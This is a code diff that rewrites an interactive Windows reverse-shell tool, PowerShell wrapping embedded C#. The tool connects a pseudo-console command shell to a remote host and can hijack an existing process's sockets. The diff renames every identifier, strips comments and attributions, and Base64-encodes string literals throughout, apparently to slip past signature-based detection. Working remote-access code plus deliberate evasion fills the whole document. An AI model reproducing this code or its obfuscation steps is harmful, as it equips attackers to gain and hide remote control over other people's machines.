@@ -1,7 +1,6 @@
-function Start-MyCustomShell
-{   
-  
-    Param
+function Invoke-ErfaBilbilack
+{
+	Param
     (
         [Parameter(Position = 0)]
         [String]
@@ -21,12 +20,12 @@ function Start-MyCustomShell
 
         [Parameter()]
         [String]
-        $CommandLine = "powershell.exe",
+        $CommandLine = "cmd.exe",
         
         [Parameter()]
         [Switch]
         $Upgrade
-    )
+    );
     
     if( $PSBoundParameters.ContainsKey('Upgrade') ) {
         $RemoteIp = "upgrade"
@@ -41,18 +40,19 @@ function Start-MyCustomShell
         if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
             throw "RemotePort missing parameter"
         }
-    }
-    $parametersNotYouShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
+    };
+    $parametersErfaBilbilack = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine);
     Add-Type -TypeDefinition $Source -Language CSharp;
-    $output = [NotYouShellMainClass]::NotYouShellMain($parametersNotYouShell)
-    Write-Output $output
+    $output = [ErfaBilbilackMainClass]::ErfaBilbilackMain($parametersErfaBilbilack);
+    Write-Output $output;
 }
 
 $Source = @"
-
-using System;
-using System.IO;
 using System.Text;
+using System.Linq;
+using System;
+
+using System.IO;
 using System.Threading;
 using System.Net;
 using System.Net.Sockets;
@@ -61,13 +61,13 @@ using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Collections.Generic;
 
-public class NotYouShellException : Exception
+public class ErfaBilbilackException : Exception
 {
-    private const string error_string = "[-] NotYouShellException: ";
+    private const string error_string = "[-] ErfaBilbilackException: ";
 
-    public NotYouShellException() { }
+    public ErfaBilbilackException() { }
 
-    public NotYouShellException(string message) : base(error_string + message) { }
+    public ErfaBilbilackException(string message) : base(error_string + message) { }
 }
 
 public class DeadlockCheckHelper
@@ -103,11 +103,8 @@ public class DeadlockCheckHelper
         LPTHREAD_START_ROUTINE delegateThreadCheckDeadlock = new LPTHREAD_START_ROUTINE(this.ThreadCheckDeadlock);
         IntPtr hThread = IntPtr.Zero;
         uint threadId = 0;
-        //we need native threads, C# threads hang and go in lock. We need to avoids hangs on named pipe so... No hangs no deadlocks... no pain no gains...
         hThread = CreateThread(0, 0, delegateThreadCheckDeadlock, IntPtr.Zero, 0, out threadId);
         WaitForSingleObject(hThread, 1500);
-        //we do not kill the "pending" threads here with TerminateThread() because it will crash the whole process if we do it on locked threads.
-        //just some waste of threads :(
         CloseHandle(hThread);
         return this.deadlockDetected;
     }
@@ -190,8 +187,8 @@ public static class SocketHijacking
         public uint TotalNonPagedPoolUsage;
         public uint TotalNamePoolUsage;
         public uint TotalHandleTableUsage;
-        public uint HighWaterNumberOfObjects;// PeakObjectCount;
-        public uint HighWaterNumberOfHandles;// PeakHandleCount;
+        public uint HighWaterNumberOfObjects;
+        public uint HighWaterNumberOfHandles;
         public uint HighWaterPagedPoolUsage;
         public uint HighWaterNonPagedPoolUsage;
         public uint HighWaterNamePoolUsage;
@@ -199,13 +196,13 @@ public static class SocketHijacking
         public uint InvalidAttributes;
         public GENERIC_MAPPING GenericMapping;
         public uint ValidAccessMask;
-        public byte SecurityRequired;//bool
-        public byte MaintainHandleCount;//bool
+        public byte SecurityRequired;
+        public byte MaintainHandleCount;
         public byte TypeIndex;
         public byte ReservedByte;
         public uint PoolType;
-        public uint DefaultPagedPoolCharge;// PagedPoolUsage;
-        public uint DefaultNonPagedPoolCharge;//NonPagedPoolUsage;
+        public uint DefaultPagedPoolCharge;
+        public uint DefaultNonPagedPoolCharge;
     }
 
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
@@ -326,28 +323,12 @@ public static class SocketHijacking
         public Int32 Protocol;
         public Int32 LocalAddressLength;
         public Int32 RemoteAddressLength;
-
-        // Socket options controlled by getsockopt(), setsockopt().
         public linger LingerInfo;
         public UInt32 SendTimeout;
         public UInt32 ReceiveTimeout;
         public UInt32 ReceiveBufferSize;
         public UInt32 SendBufferSize;
-        /* Those are the bits in the SocketProerty, proper order:
-            Listening;
-            Broadcast;
-            Debug;
-            OobInline;
-            ReuseAddresses;
-            ExclusiveAddressUse;
-            NonBlocking;
-            DontUseWildcard;
-            ReceiveShutdown;
-            SendShutdown;
-            ConditionalAccept;
-        */
         public ushort SocketProperty;
-        // Snapshot of several parameters passed into WSPSocket() when creating this socket
         public UInt32 CreationFlags;
         public UInt32 CatalogEntryId;
         public UInt32 ServiceFlags1;
@@ -355,9 +336,7 @@ public static class SocketHijacking
         public UInt32 GroupID;
         public AFD_GROUP_TYPE GroupType;
         public Int32 GroupPriority;
-        // Last error set on this socket
         public Int32 LastError;
-        // Info stored for WSAAsyncSelect()
         public IntPtr AsyncSelecthWnd;
         public UInt32 AsyncSelectSerialNumber;
         public UInt32 AsyncSelectwMsg;
@@ -381,7 +360,6 @@ public static class SocketHijacking
         public UInt32 Padding;
         public SOCKADDR LocalAddress;
         public SOCKADDR RemoteAddress;
-        // Helper Data - found out with some reversing
         [MarshalAs(UnmanagedType.ByValArray, SizeConst = 24)]
         public byte[] HelperData;
     }
@@ -405,7 +383,6 @@ public static class SocketHijacking
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
     private static extern int getpeername(IntPtr s, ref SOCKADDR_IN name, ref int namelen);
 
-    // WSAIoctl1 implementation specific for SIO_TCP_INFO control code
     [DllImport("Ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, EntryPoint = "WSAIoctl")]
     public static extern int WSAIoctl1(IntPtr s, int dwIoControlCode, ref UInt32 lpvInBuffer, int cbInBuffer, IntPtr lpvOutBuffer, int cbOutBuffer, ref int lpcbBytesReturned, IntPtr lpOverlapped, IntPtr lpCompletionRoutine);
 
@@ -437,14 +414,12 @@ public static class SocketHijacking
     [DllImport("ntdll.dll")]
     private static extern int NtCreateEvent(ref IntPtr EventHandle, int DesiredAccess, IntPtr ObjectAttributes, int EventType, bool InitialState);
 
-    // NtDeviceIoControlFile1 implementation specific for IOCTL_AFD_GET_CONTEXT IoControlCode
     [DllImport("ntdll.dll", EntryPoint = "NtDeviceIoControlFile")]
     private static extern int NtDeviceIoControlFile1(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, uint IoControlCode, IntPtr InputBuffer, int InputBufferLength, ref SOCKET_CONTEXT OutputBuffer, int OutputBufferLength);
 
     [DllImport("Ws2_32.dll")]
     public static extern int ioctlsocket(IntPtr s, int cmd, ref int argp);
     
-    //helper method with "dynamic" buffer allocation
     private static IntPtr NtQuerySystemInformationDynamic(int infoClass, int infoLength)
     {
         if (infoLength == 0)
@@ -456,10 +431,9 @@ public static class SocketHijacking
             infoLength = infoLength * 2;
             if (result == NTSTATUS_SUCCESS)
                 return infoPtr;
-            Marshal.FreeHGlobal(infoPtr);  //free pointer when not Successful
+            Marshal.FreeHGlobal(infoPtr);
             if (result != NTSTATUS_INFOLENGTHMISMATCH && result != NTSTATUS_BUFFEROVERFLOW && result != NTSTATUS_BUFFERTOOSMALL)
             {
-                //throw new Exception("Unhandled NtStatus " + result);
                 return IntPtr.Zero;
             }
             infoPtr = Marshal.AllocHGlobal(infoLength);
@@ -473,15 +447,10 @@ public static class SocketHijacking
         return ptrObjectTypesInformation;
     }
 
-    // this from --> https://github.com/hfiref0x/UACME/blob/master/Source/Shared/ntos.h
     private static long AlignUp(long address, long align)
     {
         return (((address) + (align) - 1) & ~((align) - 1));
     }
-
-    // this works only from win8 and above. If you need a more generic solution you need to use the (i+2) "way" of counting index types.
-    // credits for this goes to @0xrepnz
-    // more information here --> https://twitter.com/splinter_code/status/1400873009121013765
     private static byte GetTypeIndexByName(string ObjectName)
     {
         byte TypeIndex = 0;
@@ -489,12 +458,10 @@ public static class SocketHijacking
         IntPtr ptrTypesInfo = IntPtr.Zero;
         ptrTypesInfo = QueryObjectTypesInfo();
         TypesCount = Marshal.ReadIntPtr(ptrTypesInfo).ToInt64();
-        // create a pointer to the first element address of OBJECT_TYPE_INFORMATION_V2
         IntPtr ptrTypesInfoCurrent = new IntPtr(ptrTypesInfo.ToInt64() + IntPtr.Size);
         for (int i = 0; i < TypesCount; i++)
         {
             OBJECT_TYPE_INFORMATION_V2 Type = (OBJECT_TYPE_INFORMATION_V2)Marshal.PtrToStructure(ptrTypesInfoCurrent, typeof(OBJECT_TYPE_INFORMATION_V2));
-            // move pointer to next the OBJECT_TYPE_INFORMATION_V2 object
             ptrTypesInfoCurrent = (IntPtr)(ptrTypesInfoCurrent.ToInt64() + AlignUp(Type.TypeName.MaximumLength, (long)IntPtr.Size) + Marshal.SizeOf(typeof(OBJECT_TYPE_INFORMATION_V2)));
             if (Type.TypeName.Length > 0 && Marshal.PtrToStringUni(Type.TypeName.Buffer, Type.TypeName.Length / 2) == ObjectName)
             {
@@ -515,7 +482,6 @@ public static class SocketHijacking
             IntPtr dupedSocket = DuplicateSocketFromHandle(sock);
             if (dupedSocket != IntPtr.Zero) dupedSocketsOut.Add(dupedSocket);
         }
-        // cleaning all socket handles
         foreach (IntPtr sock in sockets)
             CloseHandle(sock);
         return dupedSocketsOut;
@@ -533,8 +499,6 @@ public static class SocketHijacking
                 closesocket(sock);
                 continue;
             }
-            // Console.WriteLine("debug: Socket handle 0x" + sock.ToString("X4") + " is in tcpstate " + sockInfo.State.ToString());
-            // we need only active sockets, the remaing sockets are filtered out
             if (sockInfo.State == TcpState.SynReceived || sockInfo.State == TcpState.Established)
             {
                 SOCKET_BYTESIN sockBytesIn = new SOCKET_BYTESIN();
@@ -547,12 +511,10 @@ public static class SocketHijacking
         }
         if (socketsBytesIn.Count < 1) return socketsOut;
         if (socketsBytesIn.Count >= 2)
-            // ordering for fewer bytes received by the sockets we have a higher chance to get the proper socket
             socketsBytesIn.Sort(delegate (SOCKET_BYTESIN a, SOCKET_BYTESIN b) { return (a.BytesIn.CompareTo(b.BytesIn)); });
         foreach (SOCKET_BYTESIN sockBytesIn in socketsBytesIn)
         {
             socketsOut.Add(sockBytesIn.handle);
-            // Console.WriteLine("debug: Socket handle 0x" + sockBytesIn.handle.ToString("X4") + " total bytes received: " + sockBytesIn.BytesIn.ToString());
         }
         return socketsOut;
     }
@@ -567,7 +529,6 @@ public static class SocketHijacking
         result = WSAIoctl1(socket, SIO_TCP_INFO, ref tcpInfoVersion, Marshal.SizeOf(tcpInfoVersion), tcpInfoPtr, tcpInfoSize, ref bytesReturned, IntPtr.Zero, IntPtr.Zero);
         if (result != 0)
         {
-            // Console.WriteLine("debug: WSAIoctl1 failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
             tcpInfoOut = new TCP_INFO_v0();
             return false;
         }
@@ -577,7 +538,6 @@ public static class SocketHijacking
         return true;
     }
 
-    // this function take a raw handle to a \Device\Afd object as a parameter and returns a handle to a duplicated socket
     private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle)
     {
         IntPtr retSocket = IntPtr.Zero;
@@ -586,7 +546,6 @@ public static class SocketHijacking
         int status = WSADuplicateSocket(socketHandle, Process.GetCurrentProcess().Id, ref wsaProtocolInfo);
         if (status == 0)
         {
-            // we need an overlapped socket for the NotYou process but we don't need to specify the WSA_FLAG_OVERLAPPED flag here because it will be ignored (and automatically set) by WSASocket() function if we set the WSAPROTOCOL_INFO structure and if the original socket has been created with the overlapped flag.
             duplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, 0);
             if (duplicatedSocket.ToInt64() > 0)
             {
@@ -596,7 +555,6 @@ public static class SocketHijacking
         return retSocket;
     }
 
-    //helper method with "dynamic" buffer allocation
     public static IntPtr NtQueryObjectDynamic(IntPtr handle, OBJECT_INFORMATION_CLASS infoClass, int infoLength)
     {
         if (infoLength == 0)
@@ -616,14 +574,13 @@ public static class SocketHijacking
                 break;
             else
             {
-                //throw new Exception("Unhandled NtStatus " + result);
                 break;
             }
         }
         if (result == NTSTATUS_SUCCESS)
-            return infoPtr;//don't forget to free the pointer with Marshal.FreeHGlobal after you're done with it
+            return infoPtr;
         else
-            Marshal.FreeHGlobal(infoPtr);//free pointer when not Successful
+            Marshal.FreeHGlobal(infoPtr);
         return IntPtr.Zero;
     }
 
@@ -641,15 +598,13 @@ public static class SocketHijacking
         hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, false, targetProcess.Id);
         if (hTargetProcess == IntPtr.Zero)
         {
-            Console.WriteLine("Cannot open target process with pid " + targetProcess.Id.ToString() + " for DuplicateHandle access");
+            Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("Q2Fubm90IG9wZW4gdGFyZ2V0IHByb2Nlc3Mgd2l0aCBwaWQg")) + targetProcess.Id.ToString() + Encoding.UTF8.GetString(Convert.FromBase64String("IGZvciBEdXBsaWNhdGVIYW5kbGUgYWNjZXNz")));
             return socketsHandles;
         }
         ptrHandlesInfo = NtQuerySystemInformationDynamic(SystemHandleInformation, 0);
         HandlesCount = Marshal.ReadIntPtr(ptrHandlesInfo).ToInt64();
-        // create a pointer at the beginning of the address of SYSTEM_HANDLE_TABLE_ENTRY_INFO[]
         IntPtr ptrHandlesInfoCurrent = new IntPtr(ptrHandlesInfo.ToInt64() + IntPtr.Size);
-        // get TypeIndex for "File" objects, needed to filter only sockets objects
-        byte TypeIndexFileObject = GetTypeIndexByName("File");
+        byte TypeIndexFileObject = GetTypeIndexByName(Encoding.UTF8.GetString(Convert.FromBase64String("RmlsZQ==")));
         for (int i = 0; i < HandlesCount; i++)
         {
             SYSTEM_HANDLE_TABLE_ENTRY_INFO sysHandle;
@@ -661,15 +616,14 @@ public static class SocketHijacking
             {
                 break;
             }
-            //move pointer to next SYSTEM_HANDLE_TABLE_ENTRY_INFO
             ptrHandlesInfoCurrent = (IntPtr)(ptrHandlesInfoCurrent.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO)));
             if (sysHandle.UniqueProcessId != targetProcess.Id || sysHandle.ObjectTypeIndex != TypeIndexFileObject)
                 continue;
             if (DuplicateHandle(hTargetProcess, (IntPtr)sysHandle.HandleValue, GetCurrentProcess(), out dupHandle, 0, false, DUPLICATE_SAME_ACCESS))
             {
                 if (deadlockCheckHelperObj.CheckDeadlockDetected(dupHandle))
-                { // this will avoids deadlocks on special named pipe handles
-                    // Console.WriteLine("debug: Deadlock detected");
+                { 
+                 
                     CloseHandle(dupHandle);
                     continue;
                 }
@@ -691,8 +645,8 @@ public static class SocketHijacking
                 if (objNameInfo.Name.Buffer != IntPtr.Zero && objNameInfo.Name.Length > 0)
                 {
                     strObjectName = Marshal.PtrToStringUni(objNameInfo.Name.Buffer, objNameInfo.Name.Length / 2);
-                    // Console.WriteLine("debug: file handle 0x" + dupHandle.ToString("X4") + " strObjectName = " + strObjectName);
-                    if (strObjectName == "\\Device\\Afd")
+                
+                    if (strObjectName == Encoding.UTF8.GetString(Convert.FromBase64String("XFxEZXZpY2VcXEFmZA==")))
                         socketsHandles.Add(dupHandle);
                     else
                         CloseHandle(dupHandle);
@@ -729,7 +683,6 @@ public static class SocketHijacking
                 (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port)
                )
             {
-                // Console.WriteLine("debug: found inherited socket! handle --> 0x" + parentSocketHandle.ToString("X4"));
                 inherited = true;
             }
             closesocket(parentSocketHandle);
@@ -746,12 +699,10 @@ public static class SocketHijacking
         ntStatus = NtCreateEvent(ref sockEvent, EVENT_ALL_ACCESS, IntPtr.Zero, SynchronizationEvent, false);
         if (ntStatus != NTSTATUS_SUCCESS)
         {
-            // Console.WriteLine("debug: NtCreateEvent failed with error code 0x" + ntStatus.ToString("X8")); ;
             return ret;
         }
         IO_STATUS_BLOCK IOSB = new IO_STATUS_BLOCK();
         ntStatus = NtDeviceIoControlFile1(socket, sockEvent, IntPtr.Zero, IntPtr.Zero, ref IOSB, IOCTL_AFD_GET_CONTEXT, IntPtr.Zero, 0, ref contextData, Marshal.SizeOf(contextData));
-        // Wait for Completion 
         if (ntStatus == NTSTATUS_PENDING)
         {
             WaitForSingleObject(sockEvent, INFINITE);
@@ -761,7 +712,7 @@ public static class SocketHijacking
 
         if (ntStatus != NTSTATUS_SUCCESS)
         {
-            // Console.WriteLine("debug: NtDeviceIoControlFile failed with error code 0x" + ntStatus.ToString("X8")); ;
+        
             return ret;
         }
         if ((contextData.SharedData.CreationFlags & WSA_FLAG_OVERLAPPED) != 0) ret = true;
@@ -777,19 +728,19 @@ public static class SocketHijacking
         {
             foreach (IntPtr socketHandle in targetProcessSockets)
             {
-                // we prioritize the hijacking of Overlapped sockets
+            
                 if (!IsSocketOverlapped(socketHandle))
                 {
-                    // Console.WriteLine("debug: Found a usable socket, but it has not been created with the flag WSA_FLAG_OVERLAPPED, skipping...");
+           
                     continue;
                 }
                 targetSocketHandle = socketHandle;
                 overlappedSocket = true;
                 break;
             }
-            // no Overlapped sockets found, expanding the scope by including also Non-Overlapped sockets
+          
             if (targetSocketHandle == IntPtr.Zero) {
-                // Console.WriteLine("debug: No overlapped sockets found. Trying to return also non-overlapped sockets...");
+         
                 foreach (IntPtr socketHandle in targetProcessSockets)
                 {
                     targetSocketHandle = socketHandle;
@@ -799,7 +750,7 @@ public static class SocketHijacking
             }
         }
         if (targetSocketHandle == IntPtr.Zero)
-            throw new NotYouShellException("No sockets found, so no hijackable sockets :( Exiting...");
+            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("Tm8gc29ja2V0cyBmb3VuZCwgc28gbm8gaGlqYWNrYWJsZSBzb2NrZXRzIDooIEV4aXRpbmcuLi4=")));
         return targetSocketHandle;
     }
     public static void SetSocketBlockingMode(IntPtr socket, int mode)
@@ -813,15 +764,13 @@ public static class SocketHijacking
         else
             result = ioctlsocket(socket, FIONBIO, ref BlockingMode);
         if (result == -1)
-            throw new NotYouShellException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
+            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("aW9jdGxzb2NrZXQgZmFpbGVkIHdpdGggcmV0dXJuIGNvZGUg")) + result.ToString() + Encoding.UTF8.GetString(Convert.FromBase64String("IGFuZCB3c2FsYXN0ZXJyb3I6IA==")) + WSAGetLastError().ToString());
     }
 }
 
-// source from --> https://stackoverflow.com/a/3346055
 [StructLayout(LayoutKind.Sequential)]
 public struct ParentProcessUtilities
 {
-    // These members must match PROCESS_BASIC_INFORMATION
     internal IntPtr Reserved1;
     internal IntPtr PebBaseAddress;
     internal IntPtr Reserved2_0;
@@ -849,22 +798,22 @@ public struct ParentProcessUtilities
         int returnLength;
         int status = NtQueryInformationProcess(handle, 0, ref pbi, Marshal.SizeOf(pbi), out returnLength);
         if (status != 0)
-            throw new NotYouShellException(status.ToString());
+            throw new ErfaBilbilackException(status.ToString());
         try
         {
             return Process.GetProcessById(pbi.InheritedFromUniqueProcessId.ToInt32());
         }
         catch (ArgumentException)
         {
-            // not found
+    
             return null;
         }
     }
 }
 
-public static class NotYouShell
+public static class ErfaBilbilack
 {
-    private const string errorString = "{{{NotYouShellException}}}\r\n";
+    private const string errorString = "{{{ErfaBilbilackException}}}\r\n";
     private const uint ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004;
     private const uint DISABLE_NEWLINE_AUTO_RETURN = 0x0008;
     private const uint PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
@@ -1090,7 +1039,7 @@ public static class NotYouShell
     {
         WSAData data;
         if (WSAStartup(2 << 8 | 2, out data) != 0)
-            throw new NotYouShellException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
+            throw new ErfaBilbilackException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
     }
 
     private static IntPtr connectRemote(string remoteIp, int remotePort)
@@ -1105,7 +1054,7 @@ public static class NotYouShell
         }
         catch
         {
-            throw new NotYouShellException("Specified port is invalid: " + remotePort.ToString());
+            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("U3BlY2lmaWVkIHBvcnQgaXMgaW52YWxpZDog")) + remotePort.ToString());
         }
 
         IntPtr socket = IntPtr.Zero;
@@ -1118,7 +1067,7 @@ public static class NotYouShell
         if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
         {
             error = WSAGetLastError();
-            throw new NotYouShellException(String.Format("WSAConnect failed with error code: {0}", error));
+            throw new ErfaBilbilackException(String.Format("WSAConnect failed with error code: {0}", error));
         }
 
         return socket;
@@ -1126,7 +1075,7 @@ public static class NotYouShell
 
     private static void TryParseRowsColsFromSocket(IntPtr shellSocket, ref uint rows, ref uint cols)
     {
-        Thread.Sleep(500);//little tweak for slower connections
+        Thread.Sleep(500);
         byte[] received = new byte[100];
         int rowsTemp, colsTemp;
         int bytesReceived = recv(shellSocket, received, 100, 0);
@@ -1154,9 +1103,9 @@ public static class NotYouShell
         pSec.bInheritHandle = 1;
         pSec.lpSecurityDescriptor = IntPtr.Zero;
         if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
-            throw new NotYouShellException("Could not create the InputPipe");
+            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("Q291bGQgbm90IGNyZWF0ZSB0aGUgSW5wdXRQaXBl")));
         if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
-            throw new NotYouShellException("Could not create the OutputPipe");
+            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("Q291bGQgbm90IGNyZWF0ZSB0aGUgT3V0cHV0UGlwZQ==")));
     }
 
     private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr)
@@ -1164,8 +1113,8 @@ public static class NotYouShell
         oldStdIn = GetStdHandle(STD_INPUT_HANDLE);
         oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
         oldStdErr = GetStdHandle(STD_ERROR_HANDLE);
-        IntPtr hStdout = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
-        IntPtr hStdin = CreateFile("CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+        IntPtr hStdout = CreateFile(Encoding.UTF8.GetString(Convert.FromBase64String("Q09OT1VUJA==")), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+        IntPtr hStdin = CreateFile(Encoding.UTF8.GetString(Convert.FromBase64String("Q09OSU4k")), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
         SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
         SetStdHandle(STD_ERROR_HANDLE, hStdout);
         SetStdHandle(STD_INPUT_HANDLE, hStdin);
@@ -1184,23 +1133,23 @@ public static class NotYouShell
         IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
         if (!GetConsoleMode(hStdOut, out outConsoleMode))
         {
-            throw new NotYouShellException("Could not get console mode");
+            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("Q291bGQgbm90IGdldCBjb25zb2xlIG1vZGU=")));
         }
         outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
         if (!SetConsoleMode(hStdOut, outConsoleMode))
         {
-            throw new NotYouShellException("Could not enable virtual terminal processing");
+            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("Q291bGQgbm90IGVuYWJsZSB2aXJ0dWFsIHRlcm1pbmFsIHByb2Nlc3Npbmc=")));
         }
     }
 
-    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr NotYouInputPipeRead, ref IntPtr NotYouOutputPipeWrite, uint rows, uint cols)
+    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ERFANInputPipeRead, ref IntPtr ERFANOutputPipeWrite, uint rows, uint cols)
     {
         int result = -1;
         EnableVirtualTerminalSequenceProcessing();
         COORD consoleCoord = new COORD();
         consoleCoord.X = (short)cols;
         consoleCoord.Y = (short)rows;
-        result = CreatePseudoConsole(consoleCoord, NotYouInputPipeRead, NotYouOutputPipeWrite, 0, out handlePseudoConsole);
+        result = CreatePseudoConsole(consoleCoord, ERFANInputPipeRead, ERFANOutputPipeWrite, 0, out handlePseudoConsole);
         return result;
     }
 
@@ -1210,7 +1159,7 @@ public static class NotYouShell
         bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
         if (success || lpSize == IntPtr.Zero)
         {
-            throw new NotYouShellException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
+            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("Q291bGQgbm90IGNhbGN1bGF0ZSB0aGUgbnVtYmVyIG9mIGJ5dGVzIGZvciB0aGUgYXR0cmlidXRlIGxpc3QuIA==")) + Marshal.GetLastWin32Error());
         }
         STARTUPINFOEX startupInfo = new STARTUPINFOEX();
         startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);
@@ -1218,12 +1167,12 @@ public static class NotYouShell
         success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);
         if (!success)
         {
-            throw new NotYouShellException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
+            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("Q291bGQgbm90IHNldCB1cCBhdHRyaWJ1dGUgbGlzdC4g")) + Marshal.GetLastWin32Error());
         }
         success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
         if (!success)
         {
-            throw new NotYouShellException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
+            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("Q291bGQgbm90IHNldCBwc2V1ZG9jb25zb2xlIHRocmVhZCBhdHRyaWJ1dGUuIA==")) + Marshal.GetLastWin32Error());
         }
         return startupInfo;
     }
@@ -1239,7 +1188,7 @@ public static class NotYouShell
         bool success = CreateProcessEx(null, commandLine, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
         if (!success)
         {
-            throw new NotYouShellException("Could not create process. " + Marshal.GetLastWin32Error());
+            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("Q291bGQgbm90IGNyZWF0ZSBwcm9jZXNzLiA=")) + Marshal.GetLastWin32Error());
         }
         return pInfo;
     }
@@ -1266,7 +1215,7 @@ public static class NotYouShell
             readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
             bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, 0);
         } while (bytesSent > 0 && readSuccess);
-        // Console.WriteLine("debug: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
+        // Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("ZGVidWc6IGJ5dGVzU2VudCA9IA==")) + bytesSent + Encoding.UTF8.GetString(Convert.FromBase64String("IFdTQUdldExhc3RFcnJvcigpID0g")) + WSAGetLastError().ToString());
     }
 
     private static void ThreadReadPipeWriteSocketNonOverlapped(object threadParams)
@@ -1282,11 +1231,9 @@ public static class NotYouShell
         {
             byte[] bytesToWrite = new byte[bufferSize];
             readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
-            // Console.WriteLine("debug ThreadReadPipeWriteSocket ReadFile: dwBytesRead = " + dwBytesRead + " Marshal.GetLastWin32Error() " + Marshal.GetLastWin32Error());
             do
             {
                 bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, 0);
-                // Console.WriteLine("debug ThreadReadPipeWriteSocket send: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
             } while (WSAGetLastError() == WSAEWOULDBLOCK);
         } while (bytesSent > 0 && readSuccess);
     }
@@ -1321,7 +1268,6 @@ public static class NotYouShell
             nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
             writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
         } while (nBytesReceived > 0 && writeSuccess);
-        //  Console.WriteLine("debug: nBytesReceived = " + nBytesReceived + " WSAGetLastError() = " + WSAGetLastError().ToString());
         TerminateProcess(hChildProcess, 0);
     }
 
@@ -1337,7 +1283,6 @@ public static class NotYouShell
         uint bytesWritten = 0;
         bool socketBlockingOperation = false;
         IntPtr wsaReadEvent = WSACreateEvent();
-        // we expect the socket to be non-blocking at this point. we create an asynch event to be signaled when the recv operation is ready to get some data
         WSAEventSelect(shellSocket, wsaReadEvent, FD_READ);
         IntPtr[] wsaEventsArray = new IntPtr[] { wsaReadEvent };
         do
